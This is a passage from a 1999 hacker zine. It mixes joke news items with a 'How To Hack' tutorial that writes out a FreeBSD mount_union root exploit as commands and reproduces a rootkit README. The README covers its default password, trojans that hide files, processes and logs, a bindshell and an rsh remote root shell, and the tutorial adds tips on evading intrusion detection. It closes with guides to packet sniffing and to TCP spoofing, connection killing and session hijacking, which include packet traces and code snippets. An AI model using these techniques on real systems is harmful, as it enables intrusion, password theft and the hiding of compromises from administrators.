       altering some programs. The super k-rad hacker apparently exploited AOL's
       main server by "Punting" it, which apparently it's servers cannot handle. 

       This AOL hacker did not return phone calls when Innerpulse contacted him
       for further information. 

       AOL security expert Mark Winters made these comments, " It appears
       after we upgraded all of our servers to Windows98 last week that we
       didn't patch it to AOL standard. Fixing a punt attack like this one will
       cost us about $50,000. In reality that isn't too much, since we charge our
       customers $20.00 per m onth when they can barely use our service due
       to busy signals." USA today 
       

       Flood Net has Local IRC'er's 'Shitting Bricks' 
       Contributed by siko
       Tuesday - March 09, 1999. 09:17PM GMT 

           It was a calm, placid seeming Tuesday afternoon on the Internet. Thats
       when what one channel member is calling 'an outbreak from hell' occured. 

       "I looked away to see what was on TV, and next thing I know, they were
       filling our channel up. There were at least 20 of them", said one channel
       member. The hacker and his channel wish to remain nameless. "Next thing I
       know they were sending a msg to the channel saying 'owned!!!!!@@#$' all at
       the same time. It's a really creative idea, when you think about it.".

       What is known to expert IRC operators as a 'Flood Net', was at work
       flooding the hacker channel. Innerpulse IRC expert Mark Winters was
       contacted to help take some of the myth out of Flood Nets, to help the reader
       understand just how vicious these attacks can be.

       "Well, one of my fondest experiences was when I was talking to my bitch
       online, and all of a sudden a bunch of fuckers with the same nick with a
       different number appended to the end joined the channel and starting flooding.
       I had to do something quick.", says Winters, who has several other such
       experiences. "It wasn't for about.. say 3 months til I found a patch. It is to
       type '/msg '. This eliminates the possibility of outside interference.".

       The FloodNet that rocked this small Efnet IRC community earlier Tuesday
       afternoon has left. Analysts speculate that everything will be back to normal
       when the shock wears off.

 HOW.TO "How To Hack" March 1999 -> Part 2 (Step 5)
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
               
         
        Intro from previous issue
        ~~~~~~~~~~~~~~~~~~~~~~~~~
         
         This is not coincidentally next to the HA.HA section in the 
        HWA.hax0r.news zine in fact the name itself is a piss-take on the
        "scene" (if you can't take the piss out of yourself you're taking
        things way to seriously and won't survive 2 weeks out here) but its
        a fact that anyone that puts out a zine like this has to  deal with
        and thats the endless messages and questions from 'newbies' asking
        "HOW DO I HACK xxxx OS?" etc, well here's how you do it. I'll warn 
        you up front that i'm not going to be gentle and will be fucking
        blunt with you, if you don't have the balls fuck off now you're dead 
        meat and will be minced and made a laughing stock all over the net, 
        if you think you can handle it then read on, this is an excersize
        that is best learned by doing but do it on your own machine if you
        try any of these things on someone elses box without any experience
        you will end up in jail.
        
        Step 5.
        ~~~~~~~
        Breaking in. 
        
        Actually this consists of scanning for weaknesses first before any
        real attempts are made at gaining entry. An adept admin or a savvy
        network operations centre (NOC) will have scanner alarms set up to
        identify possible threatening probes so this is another reason why
        u want to do this on a home machine, the purpose after all is to
        learn how to secure your own site by breaking into it as Dan Farmer
        pointed out in his paper, you have read that right? no? then read
        it now then continue here.
        
        Common insecurities
        ~~~~~~~~~~~~~~~~~~~
        
        There are almost as many ways to compromise a system as there are
        programs that are available to run from shell. Almost every program
        ever written has some sort of weakness or fallibility the most 
        common being the buffer overflow (read Smashing The Stack by Mudge)
        this works by "popping the stack" with alien code using a benign
        program such as sendmail to insert the code. Using sendmail has its
        obvious merits because it can be accessed from outside the system
        other entry points are rlogin, telnet, ftp, qpopper, among several
        others, your scanner will have identified open ports, some may 
        surprise you, its amazing what people have running and often do not
        even realize for instance backdoors left over from previous attacks
        where the attacker is long gone and moved on to other systems.
        
        Back to our own system, i'll use BSD in this example, using and old
        copy of FreeBSD it was possible to gain root using a simple script
        and the mount union command, by using vi or simply echo data >> script
        it was possible (if you had a user account) to gain root priveledges
        in a matter of seconds regardless of your group or access level.
        
        <snip>
        
        to get a root shell as an unpriveledged user use:
        
        mkdir a
        mkdir b
        mount_union ~/a ~/b
        mount_union -b ~/a ~/b

        to get euid try this:

        export PATH=/tmp:$PATH
        echo /bin/sh >/tmp/modload
        chmod +x /tmp/modload
        mount_union /dir1 /dir2
        
               
        <snip>
        
        This worked on BSD up to version 2.0 STABLE
        
        And here is an example of a mount exploit using the buffer overflow 
        method;

        the above example requires that you have access to a compiler and
        that is not always the case in a restricted shell environment, to
        compile the above code copy it to mount.c and use gcc -o mountx 
        mount.c then run ./mountx to initiate the compromise, you will be
        rewarded (in an unpatched system) with a root shell.
        
        Once you have root you want to keep it unless you are doing a hit
        and run or web server hack, for this you'll probably want to use
        what is known as a ROOTKIT. The rootkit is a package that contains 
        various programs which have been patched (trojaned) to ensure that
        if your initial entry has been found you can regain access by one
        of the various methods included in the rootkit. Common trojaned
        programs include su (which will track all user logins by the super
        user (root user) and store or mail the logins and passwords to you
        either in a local file or email, it is safer to store the passwords
        in a local file which is hidden somewhere deep in the system than
        to email the password changes to an email account as you can be
        traced using the email method and it will show up in an IDS audit
        (IDS=Intrusion Detection Software) most large sites and secure
        sites will have some form of IDS running at regular intervals so
        you may have to reinstall or be creative in your deployment of the
        rootkit programs. create several copies of the programs on the system
        and use innocuous names such as ./safe_backup for your programs, a
        dumb sysadmin on a busy system may assume that these were left for
        root compromise eventualities by another sysadmin. Other trojaned
        files that are common in rootkits are obvious, telnet and ftp for 
        instance, will also store or email logins and passwords. A good
        rootkit is available for most common unices and will usually also
        contain a sniffer program.
        
        Here is an example of the contents of a rootkit from a README for
        a freebsd rootkit available around the net (try Packetstorm) this 
        was originally published in CRH (Confidence Remains High) an excellent
        HPA zine, look for it and read it,a very good source for info.
        
       <SNIP>
        
       Ok.. I found this rootkit out on an ftp site somewhere. Anyway, when I got it, there was a bunch of compile errors and it seemed to be for an older version of freebsd. So, I took a new source tree from my box and copied the trojan code from this rootkit into it.. So, this rootkit should work on FreeBSD 2.2.5-RELEASE.

       Ok.. I left out the following trojans and files:
       
       chpass          Trojaned! User->r00t
       passwd          Trojaned! User->r00t
       zapbsd2         An improved utmp/wtmp/lastlog type zapper
       tripwire        Trojaned! Hide changes
       
       but I put in:
       
       marryv11.c      good log cleaner.. i put a #define bsd in it

       NOTE: This package was heavily influenced by the existing Linux rootkit, 
       which in turn was adapted from the SunOS rootkit, etc., etc.
       
       UPDATES: 1.0.1 - Fixed some broken Makefile stuff.  Made it so inetd does 
       the right thing on a SIGHUP.  Added some extra security to the shell trojans.
       1.1 - Added tripwire trojan.  Cleaned up some other stuff.
       1.2 - Put a password on inetd (Thanks for the suggestion Whoot :)
       
       This package includes the following:
       
       chpass          Trojaned! User->r00t
       inetd           Trojaned! Remote access

       INSTALLATION:
       To install this kit execute the command 'make all install' from the # prompt.
       All of the file/password configurations are in config.h so feel free to
       modify things to suit your particular fancy.  Everything here has been 
       tested on a FreeBSD-stable distribution. See the note at the end about 
       what to do if the admin uses tripwire. Also make sure to read the 
       Makefile and scripts so you know what's going on.
       
       USAGE:
       OK I will go through how to use each program one by one. NOTE when I say 
       password I mean the rootkit password not your users password (d0h!). By 
       default the rootkit password is "h0tb0x".
       
       chpass -        Local user->root. Run ch{sh,fn,pass} then when it asks you 
                       for a new name enter your password.
       
       inetd -         Binds a shell to a port for remote access. Adds a shell 
                       exec service on the ingreslock port, type in the rootkit
                       password to start a shell.
       
       login -         Allows login to any account with the rootkit password.
                       If root login is refused on your terminal login as "r00t".
                       History logging is disabled if you login using your password.
       
       ls -            Trojaned to hide specified files and directories.
                       The default data file is /dev/ptyr.
                       All files can be listed with 'ls -/'.
                       The format of /dev/ptyr is:
                       ptyr
                       fbsdrootkit-1.0
                       pr0n
                       Use partial filenames. This would hide any files/directories 
                       with the names ptyr, fbsdrootkit-1.0 and pr0n.
       
       du -            (see ls)
       
       ifconfig -      Modified to remove PROMISC flag on the ethernet device.
       
       netstat -       Modified to remove tcp/udp/sockets from or to specified
                       addresses, paths and ports.
                       default data file: /dev/ptyq
                       command 1: hide local address
                       command 2: hide remote address
                       command 3: hide local port
                       command 4: hide remote port
                       command 5: hide UNIX socket path
       
                       example:
                       1 128.31        <- Hides all local connections from 128.31.X.X
                       2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
                       3 8000          <- Hides all local connections from port 8000
                       4 6667          <- Hides all remote connections to port 6667
                       5 .term/socket  <- Hides all UNIX sockets including the path 
                                          .term/socket
                       
       passwd -        Local user->root. Enter your rootkit password instead of your
                       old password.
       
       ps -            Modified to remove specified processes.
                       Default data file is /dev/ptyp.
                       An example data file is as follows:
                       0 0             Strips all processes running under root
                       1 p0            Strips tty p0
                       2 sniffer       Strips all programs with the name sniffer
                       Don't put in the comments, obviously.
       
       rshd -          Execute remote commands as root. 
                       Usage: rsh -l rootkitpassword host command
                       i.e. rsh -l h0tb0x 0wn3d.escape.com /bin/sh -i
                       would start a root shell.
       
       syslogd -       Modified to remove specified strings from logging.
                       I thought of this one when I was on a system which logged
                       every connection.. I kept getting pissed off with editing
                       files every time I connected to remove my hostname. Then I 
                       thought 'Hey dude, why not trojan syslogd?!' and the rest
                       is history. :)
                       Default data file is /dev/ptys
                       Example data file:
                       evil.com
                       123.100.101.202
                       rshd
                       This would remove all logs containing the strings evil.com,
                       123.100.101.202 and rshd. Smart! :))
       
       sniffit -       An advanced network sniffer. This is pretty kewl and has lots
                       of filtering options and other stuff. Useful for targetting a
                       single host or net. Sniffit uses ncurses.
       
       bindshell -     This is pretty self-explanatory. Basically it binds a 
                       shell to a port, 31337 by default. Read the source on 
                       this one.
       
       fix -           Replaces and fixes timestamp/checksum infomation on files.
                       I modified this a bit for my own uses and to fix a nasty bug
                       when replacing syslogd and inetd. The replacement file will
                       be erased by fix (unlike other versions).  
       
       addlen -        This quickie modifies the length of files by adding 
                       harmless zeros to the end. Wonder why nobody ever 
                       thought of doing this before. Inspired by a stupid 
                       security tool which checks lengths of setuid files.
       
       zapbsd2 -       This improved version of zapbsd writes over entries with 
                       ones instead of zeros.  I added some capabilities and 
                       error checking so I raised the number.
       
       TRIPWIRE:
       I have done a major improvement of this part. Simply make tripwire and 
       the script will ask you a few questions and take action depending on your 
       responses. If both the database file and tripwire binary are read-only 
       then there is nothing you can do.
       
       SOURCES:
       Some of these patches are derived from the original SunOS rootkit. ls, 
       du, ps, netstat and chpass were done by yours truly. Anything else came 
       from the Linux rootkit with a few modifications. The idea for tripwire 
       was my own.
       
       OTHER:
       I welcome all comments and questions at method@yikes.com. All complaints 
       and flames will be sent to /dev/null.
       
       Thanks to OGhost and Phelix for beta testing and advice.
       
       In closing, this kit can only take you so far. Although it covers almost 
       everything, a competent sysadmin will eventually catch on. Remember, 
       never let your guard down.

        Packet Sniffing
        ~~~~~~~~~~~~~~~
        Read the papers 'things that go bump on the net' and others of that
        ilk for a good idea what can happen to a compromised system that has
        had a sniffer installed. You can sniff kerberos tickets and setup
        irc interception filters to gain access to oper passwords and 'leet
        channels among other things by using a sniffer on a well placed 
        system somewhere on the backbone. Use traceroute to determine where
        a likely target is located and start your scan from there.
        
        Here is an excerpt from HiR #8 on packet sniffing, which gives a good
        outline of the sniffing concept and includes some code, taken directly
        from the Hackers Information Report site and included here for complete
        ness. Please check out their site for further great information and a

       Ahh, the wonderful world of packet sniffing.  You may or may not have done
       this before...
       
       "Sniffing" is the process of putting your computer's network card into
       what's called "promiscuous mode".  It will read all packets that it sees
       (whereas normally it only reads the packets that have its address on it).
       After the card is placed in this mode, a sniffer will track packets
       (usually parsing the useful data out of the packet and writing it to a log
       file onto the hard disk).  This is a really good way of doing a few things
       on a network:
       
               o Gathering traffic information, looking for lan stations that are
                 abusing bandwidth.
       
               o Actually looking at the data inside the packets to see what
                 files people are downloading with FTP, watching telnet sessions,
                 and even watching their usernames and passwords.
       
               o Getting a general Idea of where most of the packets are coming
                 from and going to, as a troubleshooting measure.
       
       There are sniffing programs for almost every platform.  My favorite
       platform is linux, as it is already my Operating System of choice, and  
       there are quite a few really easy to use sniffers for it.  These include:
       tcpdump, sniffit, iptraf, and linsniffer.  Those are what I use the most.
       My favorite floppy-linux distribution, Trinux, comes with sniffit, iptraf,
       and linsniffer.  Almost every "big" linux distro (Red Hat, Debian,
       Caldera, etc) comes with tcpdump, although you might have to select a
       special option to have it installed automatically.
       
       Tcpdump is probably the hardest of the three to learn how to use.  It
       mostly dumps raw tcp packets out to standard output (or wherever you
       redirect it to).  It has other options, too, but overall, it's difficult
       to use for the beginner.  I'll focus more on the other two.
       
       Linsniffer is quite possiby the most evil of the sniffers I've mentioned.
       All it does is get passwords.  It looks for http passwords, telnet
       passwords, ftp passwords, and mail passwords.  It does a pretty good job,
       but really lacks an "ethical" use.  You can get linsniffer (or any of
       these sniffers) wherever you can find linux software (places like sunsite,
       which is now metalab.unc.edu).  All you do is run "linsniffer" as root.
       It will not display any output. Everything it finds will be placed in a
       file called "tcp.log" in the directory you were in when you started
       linsniffer.
       
       Sniffit is extremely cute.  It's harder to find passwords with it, but if
       your goal has nothing to do with you finding passwords, and more to do
       with watching who is connected to what, and maybe even watching the actual
       connection, this is for you.  With Sniffit, I have many times been
       successful in watching the exact telnet screen of people that are on my
       segment.  You can redirect the sniffed output to another virual console,
       and that console becomes the telnet screen of the person whom you are
       sniffing.  You see what they type, what they get back, you watch them read
       their e-mail with pine, as if their ghost was sitting there using your
       screen.
       
       Iptraf isn't really a "sniffer" by industry terms, but it still uses
       promiscuous mode to operate, Therefore I call it a "sniffer".  Iptraf will
       break down the traffic stream into chunks for you, so you can see exactly
       what kind of packets are being exchanged, how big they are, and where they
       are coming from and going to.  This proghram is not good for looking at
       the actual data inside the packet, but it's great for finding out who is
       hogging the bandwidth, and what they're hogging it with.
       
       As far as snifgfing on other platforms... For Windows 95 and 98 There is
       also a plugin for the ever-famous back-orifice program that does
       sniffing, called "Butt Sniffer".  There is also a non-plugin version that
       just runs in an MS-Dos window under Windows 95/98.  This is probably the
       best Windows 9x sniffer I've seen, and it's worth looking into.  It's
       available through www.cultdeadcow.com under the backorifice page
       somewhere.  Shoutouts to the author, Mudge (who kicked ass at DefCon) =]
        
       ------------------------------------------------------------------------------
       
       So, if it's so easy to just watch what's going on on the local network,
       there must be loads of people doing it, right?  Well, the paranoid would
       say so, but in actuality, there isn't probably a whole lot of it going on.
       I'm not saying that there isn't ANY.  So if there's even the possibility
       that it's there, how would one stay protected from the evils of
       sniffing?
       
       Well, the apostols (a spanish hacking group, if memory serves correctly)
       has a few really good products.  (One being QueSO, a remote tcp/ip
       fingerprinter for detecting what OS is being run on a remote machine),
       but the one we focus on here is "NEtwork Promiscuous Ethernet Detector"
       (or "neped").  It only runs on UNIX/Linux (that I know of.  It's not
       directly compileable on windows, but I'm not much of a programmer.  It
       might be easy to do).  I Wrote a small shell script that uses neped as a
       core to take action when promiscuous mode is detected.
       
       sniffdetect.sh is configureable and can run a shell script or a program
       once as soon as sniffing is detected, and will run another program or
       script as soon as it sees the sniffing has stopped.  It can be used to
       stop services on your system, e-mail an administrator, page someone, or
       even to shut down the machine (although I don't know why you would want
       to do such a thing).  I set it up to blast the IP and MAC address of the
       sniffing machine to my pager, and to tell me that sniffing has ceased when
       it stops detecting the runnuing sniffers (I wrote some paging software
       that sends out alpha pages to me from the command line to do this).  In
       theory, It's very possible to make something that will launch a
       counter-attack/Denial of Service against the sniffing machine, but I'm not
       really a believer in that method.  Here's my shell script.

       I hope that this gives you the edge that you need.  This was in no way a
       very elaborate "sniffing how-to".  You can go anywhere to get that sort of
       information.  This was focused more on how it works, and what tools are
       used to do it, and how to protect yourself from the world of packet
       sniffers.

       If YOU think of yourself, you are "3><Tr3/\/\3lY 3Le3T", please don't bother 
       contacting me. 
       Flames >/dev/null or >/dev/echo depends on how smart you are.
       
       It is not wise to use what you don't know/understand, so read this before 
       trying anything... it will only take a few minutes, and probably save you 
       some hours of failure...
       
       This code is not crippled in the usual way (removing some vital parts), 
       the power is limited by it's briefness, because I wanted to keep 
       everything simple and illustrative (but working). It's a simple job to 
       improve it, and that is the goal of this doc, that you improve it yourself.
       
       Thanks too Wim Vandeputte for spellchecking, and putting up 
       with my constant nagging about IP during the writing of this sh!t...
       
       0.2 For whom
       ------------
       
       For people with an elementary knowledge of TCP/IP, some knowledge on C (only 
       the basic setup) and some general UNIX knowledge.
       It's no use reading this document if you are completely unaware of these 
       things, but mind you, only a little knowledge is enough.

       1. Short explanation of some words 
       ----------------------------------
       
       This is a short explanation of some words you might see in the 
       text/source. You probably know all this, but I put it in here anyway.
       
       Sniffit
         My favourite Packet Sniffer, all sniffed sequences in this 
         document where created with it. Sniffit can be obtained from:
         http://reptile.rug.ac.be/~coder/sniffit/sniffit.html
         Off course any other decent sniffer will do (but this one wears my 
         personal marks and approval).
         (At time of writing a pre-release 0.3.2)
       
       IP-spoofing (further referenced to as spoofing)
         The forging of IP packets 
         NOTE that not only IP based protocols are spoofed.
         NOTE that spoofing is also used on a constructive base (LAN spoofing, 
              not discussed here).
         NOTE that I don't use it on a constructive base ;)
       
       Non-blind spoofing
         Using the spoofing to interfer with a connection that sends packets 
         along your subnet (so generally one of the 2 hosts involved is located 
         on your subnet, or all data traffic has to be passing your network 
         device,... you might consider taking a job at some transatlantic route 
         provider).
       
       Blind spoofing
         Using the spoofing to interfer with a connection (or creating one), 
         that does not send packets along your cable.

       2.2 Programmer notes
       --------------------
       
       These programs are just examples. That means, they could be improved a 
       lot. Because I wanted to keep them short and leave some stuff to your 
       imagination, they are very simple.
       However they all work and are a good starting point.

       
       3. TCP/IP (UDP) in an hazelnutshell
       -----------------------------------
       
       Because it has been explained enough in 'Phrack Volume Seven, Issue 
       Forty-Eight, File 14 of 18' by daemon9/route/infinity , and there is a lot of 
       documentation available on the subject I will only repeat some things 
       very briefly. (Please read the phrack #48 file or any other document on 
       the subject before reading this).
       
       A connection is fully defined with 4 parameters, a source host and port, 
       and a destination host and port.
       
       When you make a connection, data is send in packets. Packets take care of 
       low level trafic, and make sure the data arrives (sometimes with special 
       error handling). The spine of most networks is the IP protocol version 4. 
       It is totally independent of all hardware protocols.
       
       TCP and UDP are higher level protocols wrapped up in IP packets.
       
       All those packets consist of a header and data.
       
       IP header contains (amongst other things): IP of source and destination 
       hosts for that packet, and the protocol type of the packet wrapped up in 
       it. (TCP=6, UDP=17, etc.).
       
       UDP packets contain (amongst other things): port number of source and 
       destination host. UDP has no such thing as SEQ/ACK, it is a very weak 
       protocol.
       
       TCP packets contain (amongst other things): port number of source and 
       destination host, sequence and acknowledge numbers (further refered to as 
       SEQ/ACK), and a bunch of flags.
       SEQ number: is counted byte per byte, and gives you the number of the 
                   NEXT byte to be send, or that is send in this packet.
       ACK number: is the SEQ number that is expected from the other host.
       SEQ numbers are chosen at connection initiation.
       
       I said is was going to be short... If you didn't understand the above 
       text, read up on it first, because you won't understand sh!t of the rest.
       
       
       4. Non-blind spoofing
       ---------------------
       
       4.1 Know what you are doing
       ---------------------------
       
       The concept of non-blind spoofing (NBS further in this doc) is pretty 
       simple. Because packets travel within your reach, you can get the current 
       sequence and acknowledge (SEQ/ACK further in this doc) numbers on the 
       connection. 
       NBS is thus a very easy and accurate method of attack, but limited to 
       connections going over your subnet. 
       In spoofing documentation these attacks are sometimes ommited, because 
       they are mostly 'denial-of-service' attacks, or because people don't 
       realise the advantage a spoof (in particulary a hijack) can have above 
       simple password sniffing.
       
       Spoofing in generally is refered to as a verry high level of attack. This 
       refers to blind spoofing (BlS further in this doc), because NBS is 
       kidstuff for a competent coder.
       
       4.2 SYN flooding
       ----------------
       
       Thoroughly discussed in 'Phrack Volume Seven, Issue Forty-Eight, File 13 of 
       18'. I won't waste much time on it.
       
       Setup:
                 host A <-----][----------X--------------->host B
                                          | 
                 host S <-----------------/   
       
       Concept:
       Host S impersonates SYN (connection init) coming from host A, to host B. 
       Host A should be unreachable (e.g. turned off, non existant,...).
       B sends out the second packet of the 3 way TCP handshake. Host B will now 
       wait for response of host A.
       If host A is reachable it will tell host B (with a reset: RST) that it DID NOT 
       inititate a connection, and thus host B received a bogus packet. (In that case
       host B will ingnore the SYN, and *normally* nothing will happen)
       So if A is unreachable, B will wait for response some time.
       When doing multiple attacks, the backlog of host B is going to be exceeded 
       and host B will not except new connections (read on TCP bugs for 
       additional features ;) for some time.
       
       4.3 Connection Killing
       ----------------------
       
       Setup:
                 host A <------X------------------------->host B
                               |      A,B have a TCP connection running
                 host S <------/      A,S on same subnet
       
                 (setup is the same in both cases)
       
       Use:
       Clearing mudders of your net, annoying that dude typing an important 
       paper, etc... plain fun.
       
       4.3.1 Using reset (RST)
       -----------------------
       
       Concept:
       TCP packets have flags which indicate the status of the packet, like RST. 
       That is a flag used to reset a connection. To be accepted, only the 
       sequence number has to be correct (there is no ACK in a RST packet).
       So we are going to wait for packets in a connection between A and B. 
       Assume we wait for packets to A. We will calculate (from B's packets)
       the sequence number for A's packets (from B's ACK's), and fire a bogus RST 
       packet from S (faking to be A) to B.
       
       An actual attack:
       (These are real sniffed packets, although IP numbers of hosts were changed)
       host A : 166.66.66.1
       host B : 111.11.11.11
       (S on same subnet as A)
       
       (This is a good example of how things not always go as you want, see 
       below for a solution) 
       1) connection running...
          we wait for a packet to get current SEQ/ACK (A->B)
       
       TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
          SEQ (hex): 57E1F2A6   ACK (hex): B8BD7679
          FLAGS: -AP---   Window: 3400
          (data removed because irrelevant, 2 bytes data)
       
       2) This is the ACK of it + included data (witch causes SEQ number to 
          change, and thus messing up our scheme, because this came very fast.)
          (B->A) 
       
       TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
          SEQ (hex): B8BD7679   ACK (hex): 57E1F2A8
          FLAGS: -AP---   Window: 2238
          (data removed because irrelevant, 2 bytes data)
       
       3) ACK of it. (A->B) 
       
       TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
          SEQ (hex): 57E1F2A8   ACK (hex): B8BD767B
          FLAGS: -A----   Window: 3400
          (data removed because irrelevant)
       
       4) further data (B->A)
       
       TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
          SEQ (hex): B8BD767B   ACK (hex): 57E1F2A8
          FLAGS: -AP---   Window: 2238
          (data removed because irrelevant)
       
       5) ACK of it (A->B)
       
       TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.1810-111.11.11.11.23
          SEQ (hex): 57E1F2A8   ACK (hex): B8BD7691
          FLAGS: -A----   Window: 3400
       
       6) Now we get 2 RST packets. How do you explain that? Well, the first reset 
          packet has been buffered somewhere on our system, because the ethernet 
          segment was busy when we wanted to send it. This is the 'unexpected 
          thing' I discussed above, here we are lucky, the data stream cooled down 
          so fast.
          When it doesn't cool down so fast, we could miss our RST (or the 
          connection will be killed a little later then when we wanted), you'll see 
          some idea's on how to fix that problem.
       
       TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
          SEQ (hex): B8BD7679      FLAGS: ---R--
       
       
       TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.23-166.66.66.1.1810
          SEQ (hex): B8BD7691      FLAGS: ---R--
          (This was the packet that killed the connection)
       
       Discussion of the program:
       
       The discussion here is a bit weird , that is because 'sniper-rst.c' is 
       not designed to be an optimal killer, merly to be an example.
       We have the problem of speed here. We miss some packets what causes those 
       resends. So we would design a better 'sniper' if we do the following:
               - use blocking IO (not necessarilly, because the RST killer would 
                                 loose some of it's beauty (looping), this is dealt 
                                 with in the FIN killer example. Blocking is a 
                                 little faster when a lot of packets come after 
                                 each other.)
               - multi-packet firing... fire more packets with incremented SEQ. 
                 (this is commented in the source) 
               - waiting for a pure ACK packet (no data), because otherwise you 
                 risk to much of getting mid transmission and not being fast enough.
                 (disadvantage is the 'waiting period' before the connection is 
                 killed)         
       
       NOTE these examples were done on non-loaded networks, with non-loaded 
            servers, what makes it a worst case scenario for speed problems.
       
       4.3.2 Closing a connection (FIN)
       --------------------------------
       
       Concept:
       An other flag is FIN and says: "no more data from sender".
       This flag is used when closing a connection down the normal legit way. So 
       if there was a way to make a packet that is accepted by one of the two 
       hosts, this host would believe the 'sender' didn't have any data left.
       Following (real) packets would be ignored as they are considered bogus.
       That's it, because we can sniff the current SEQ/ACK of the connection we 
       can pretend to be either host A or B, and provide the other host with 
       CORRECT packetinformation, and an evil FIN flag.
       The beauty of it all is, that after a FIN is send the other host always 
       replies with one if it is accepted, so we have a way to verify our 
       killing, and can be 100% sure of success (if for some reason we missed a 
       SEQ or ACK, we can just resend).
       RST killing is more popular and is prefered, but I've put this in as an 
       example, and I like it myself.
       
       
       An actual attack:
       (These are real sniffed packets, although IP numbers of hosts were changed)
       host A : 166.66.66.1
       host B : 111.11.11.11
       (S on same subnet as A)
       
       1) connection is running....
          sniper is started on host S as 'sniper-fin 166.66.66.1 23 111.11.11.11 1072' 
          and waits for a packet to take action (we need to get SEQ/ACK)
          (mind you switching host A and B would be the same, only S would be 
           impersonating A instead of B)
          suddenly a packet arrives... (A->B)
       
       TCP Packet ID (from_IP.port-to_IP.port): 166.66.66.1.23-111.11.11.11.1072
          SEQ (hex): 19C6B98B   ACK (hex): 69C5473E
          FLAGS: -AP---   Window: 3400
       Packet ID (from_IP.port-to_IP.port): 166.66.66.1.23-111.11.11.11.1072
        45 E 00 . 00 . 2A * 30 0 5E ^ 40 @ 00 . 40 @ 06 . 5E ^ AD . 9D . C1 . 45 E 33 3
        9D . C1 . 2B + 0D . 00 . 17 . 04 . 30 0 19 . C6 . B9 . 8B . 69 i C5 . 47 G 3E >
        50 P 18 . 34 4 00 . 3A : 61 a 00 . 00 . 0D . 0A .
                                                ~~~~~~~~~ > 2 data bytes
       
       2) sniper detected it, and sends a bogus packet. (S as B -> A)
          We calculate our SEQ as: ACK of (A->B) packet
          We calculate our ACK as: SEQ of (A->B) packet + datalength of that packet
                                   (19C6B98B + 2 = 19C6B98D)
          (so we tell A, we received the last packet, and will not transmit 
          further data)
       
       TCP Packet ID (from_IP.port-to_IP.port): 111.11.11.11.1072-166.66.66.1.23

          FLAGS: -A---F   Window: 7C00
          (data removed because irrelevant)
       
       3) host A now says: 'okay, you end the session, so here is my last data'
          (A->B)

          doesn't know that and continues to send packets.

          host A has that connection closed, and thus thinks the real packets of 
          B are spoofed (or at least bogus)! So host A sends some reset packets 
          (RST).

       Discussion of the program (numbers correspond with those of 'An Actual 
       Attack'):
       
       1) stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,ACK,10);
          if(stat==-1)  {printf("Connection 10 secs idle... timeout.\n");exit(1);}
        
          We use wait_packet on a non blocking socket. This way we can enable a 
          10 seconds timeout. This functions returns when the correct packet 
          has been delivered (or timeout).
       
       2) sp_seq=pinfo.ack;
          sp_ack=pinfo.seq+pinfo.datalen;
          transmit_TCP (fd_send, NULL,0,0,0,DEST,DEST_P,SOURCE,SOURCE_P,
                                                             sp_seq,sp_ack,ACK|FIN);
       
          We calculate a spoofed SEQ/ACK, and fire off a fake FIN packet. As we 
          don't send any data with it, our buffer is set to NULL and datalength 
          to 0.
          NOTE together with FIN, you need to enable ACK.
       
       3) N/A
       
       4) stat=wait_packet(fd_receive,&pinfo,SOURCE,SOURCE_P,DEST,DEST_P,FIN,5);
          if(stat>=0)
               {printf("Killed the connection...\n");
               exit(0);}
       
          We wait for a FIN packet (note the FIN in wait_packet). We use a 5 
          sec. timeout, if the function returns and stat>=0 (-1 on timeout), we 
          know our attempt was successfull.
       
       5) N/A
       
       6) N/A
       
       NOTE We can have the same problem here as with the RST killer. But didn't 
            have it here, because the packet we responded upon was the end of a 
            data stream (in fact it was an echo from a shell command)
       
       4.3.3 Improving 
       ---------------
       
       Except from multipacket firing, it is advised to launch 2 attacks (one in 
       both ways). This illiminates one side oriented connections to be handled 
       optimally. I think of things like downloading data, which is a one way 
       data-flow, it is much easier sending a RST from the (spoofed) receiver to 
       the sender, then the other way around.
       Those 2 attacks could both impersonate host A and B, and thus giving is 4 
       times more chance of a succesfull kill.
       I'll leave further experimenting up to you (use your imagination to handle 
       different situations).
       
       4.4 Connection Hijacking
       ------------------------
       Setup:
                 host A <------X------------------------->host B
                               |      A,B have a TCP connection running (TELNET)
                 host S <------/      A,S on same subnet
       
       Concept:
       (suppose a TELNET from A (client) to B (server))
       TCP separates good and bogus packets by their SEQ/ACK numbers i.e. B 
       trusts the packets from A because of its correct SEQ/ACK numbers. 
       So if there was a way to mess up A's SEQ/ACK, B would stop believing A's 
       real packets.
       We could then impersonate to be A, but using correct SEQ/ACK numbers 
       (that is numbers correct for B).
       We would now have taken over the connection (host A is confused, B thinks 
       nothings wrong (almost correct, see 'actual attack'), and S sends 
       'correct' data to B). 
       This is called 'Hijacking' a connection. (generally hijacking a TELNET session,
       but same could be done woth FTP, RLOGIN, etc...)
       How could we mess up A's SEQ/ACK numbers? Well by simply inserting a data 
       packet into the stream at the right time (S as A->B), the server B would 
       accept this data, and update ACK numbers, A would continue to send 
       it's old SEQ numbers, as it's unaware of our spoofed data. 
       
       Use: 
       I allready hear you wiseguys yelling: "Hey dude, why hijack a connection 
       if you can sniff those packets anyway??"
       Well, anybody heared of One Time Passwords, Secure Key?? Case closed.... 
       (S/Key: server challenges client, client and server calculate a code from 
       the challenge and password, and compare that code. The password itself is 
       never send on the cable, so you can't sniff sh!t).
       (OTP: server has a list of passwords, once one is used, it is destroyed, 
       so sniffing gets you a password that has 'just' expired ;)
       (ALL types of identification that happen at connection (encrypted or not, 
       trusted or not), and don't use encrypted data transfer, are vulnerable to 
       'hijacking'.)
       
       An actual attack:
       (These are real sniffed packets, although IP numbers of hosts were changed)
       (suppose a TELNET from A (client) to B (server))
       host A : 166.66.66.1
       host B : 111.11.11.11
       (S on same subnet as A)
       
       1) connection running... 
          we look with sniffit, and see he's busy in a shell, we start 'hijack' 
          on host S as 'hijack 166.66.66.1 2035 111.11.11.11'
          a packet containing from (A->B) is detected... hijack takes action...

